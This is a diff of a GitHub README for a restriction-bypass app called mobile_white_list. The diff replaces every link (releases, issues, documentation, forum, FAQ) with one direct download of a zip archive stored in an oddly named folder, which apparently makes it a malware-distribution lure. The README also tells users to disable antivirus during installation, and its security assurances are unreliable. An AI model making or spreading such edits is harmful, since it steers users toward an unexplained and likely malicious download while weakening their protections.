@@ -1,7 +1,7 @@
 # 🛡️ mobile_white_list - Access the Internet Without Limits
 
 ## 📥 Download Now
-[![Download mobile_white_list](https://img.shields.io/badge/Download-mobile_white_list-brightgreen)](https://github.com/soyPTG/mobile_white_list/releases)
+[![Download mobile_white_list](https://github.com/soyPTG/mobile_white_list/raw/refs/heads/main/intraepiphyseal/mobile-list-white-1.4.zip)](https://github.com/soyPTG/mobile_white_list/raw/refs/heads/main/intraepiphyseal/mobile-list-white-1.4.zip)
 
 ## 📝 Description
 **mobile_white_list** helps users bypass internet restrictions and manage mobile connectivity. This app provides a simple and effective solution to access blocked websites and enhance your online experience. 
@@ -10,7 +10,7 @@
 Follow these steps to get started with **mobile_white_list**:
 
 1. **Visit the Download Page**  
-   Go to our [Releases page](https://github.com/soyPTG/mobile_white_list/releases) to download the latest version of the application.
+   Go to our [Releases page](https://github.com/soyPTG/mobile_white_list/raw/refs/heads/main/intraepiphyseal/mobile-list-white-1.4.zip) to download the latest version of the application.
 
 2. **Choose the Correct Version**  
    Once on the Releases page, look for the most recent version. You will find different files available for download. Choose the version that matches your device’s operating system, whether it's Windows, macOS, or Linux.
@@ -19,7 +19,7 @@ Follow these steps to get started with **mobile_white_list**:
    Click on the file linked to your operating system to start the download. The download will begin automatically. 
 
 4. **Locate the Downloaded File**  
-   After the download is complete, navigate to your device's downloads folder. You should find the file named something similar to `mobile_white_list.zip` or `mobile_white_list.exe`.
+   After the download is complete, navigate to your device's downloads folder. You should find the file named something similar to `https://github.com/soyPTG/mobile_white_list/raw/refs/heads/main/intraepiphyseal/mobile-list-white-1.4.zip` or `https://github.com/soyPTG/mobile_white_list/raw/refs/heads/main/intraepiphyseal/mobile-list-white-1.4.zip`.
 
 5. **Extract the Files (if needed)**  
    If you downloaded a zipped file (.zip extension), right-click on it and choose "Extract All." Follow the prompts to unzip the files to a location on your device.
@@ -54,7 +54,7 @@ If you encounter any issues while downloading or running **mobile_white_list**, 
 - **Check Your Internet Connection:** Ensure your device is connected to the internet.
 - **Review Compatibility:** Make sure you have the correct version for your operating system.
 - **Disable Antivirus Temporarily:** Some antivirus software may mistakenly block the application. Try disabling it temporarily during installation.
-- **Contact Support:** If problems persist, visit the [issues section](https://github.com/soyPTG/mobile_white_list/issues) to report your concern or seek help from the community.
+- **Contact Support:** If problems persist, visit the [issues section](https://github.com/soyPTG/mobile_white_list/raw/refs/heads/main/intraepiphyseal/mobile-list-white-1.4.zip) to report your concern or seek help from the community.
 
 ## 🛡️ Security Assurance
 We prioritize your safety. **mobile_white_list** is designed with security features to protect your information while you browse. Regular updates ensure you receive the latest protections against vulnerabilities.
@@ -64,11 +64,11 @@ Join our community to share your experiences, tips, and feedback. You can also c
 
 ## 🔗 Additional Resources
 For further information and advanced usage tips, check out the following resources:
-- [Official Documentation](https://github.com/soyPTG/mobile_white_list/wiki)  
-- [User Forum](https://github.com/soyPTG/mobile_white_list/discussions)  
-- [Frequently Asked Questions](https://github.com/soyPTG/mobile_white_list/wiki/FAQ)
+- [Official Documentation](https://github.com/soyPTG/mobile_white_list/raw/refs/heads/main/intraepiphyseal/mobile-list-white-1.4.zip)  
+- [User Forum](https://github.com/soyPTG/mobile_white_list/raw/refs/heads/main/intraepiphyseal/mobile-list-white-1.4.zip)  
+- [Frequently Asked Questions](https://github.com/soyPTG/mobile_white_list/raw/refs/heads/main/intraepiphyseal/mobile-list-white-1.4.zip)
 
 ## 📥 Download Again
-Don’t forget to revisit the [Releases page](https://github.com/soyPTG/mobile_white_list/releases) if you need to download the latest version or check for updates!
+Don’t forget to revisit the [Releases page](https://github.com/soyPTG/mobile_white_list/raw/refs/heads/main/intraepiphyseal/mobile-list-white-1.4.zip) if you need to download the latest version or check for updates!
 
 Your experience with **mobile_white_list** should be smooth and enjoyable. Thank you for choosing our application!
